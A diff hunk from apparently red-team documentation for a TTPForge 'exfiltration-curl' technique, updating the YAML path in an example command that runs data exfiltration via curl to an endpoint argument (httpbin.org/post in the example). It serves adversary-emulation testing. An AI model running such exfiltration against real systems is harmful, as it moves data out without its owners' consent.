@@ -16,7 +16,7 @@ This TTP enables the exfiltration of data via a specified endpoint using curl.
 
 You can run the TTP using the following example (after updating the arguments):
 ```bash
-ttpforge run forgearmory//exfiltration/exfiltration-curl.yaml \
+ttpforge run forgearmory//exfiltration/exfiltration-curl/ttp.yaml \
   --arg exfil_endpoint=https://httpbin.org/post
 ```
 
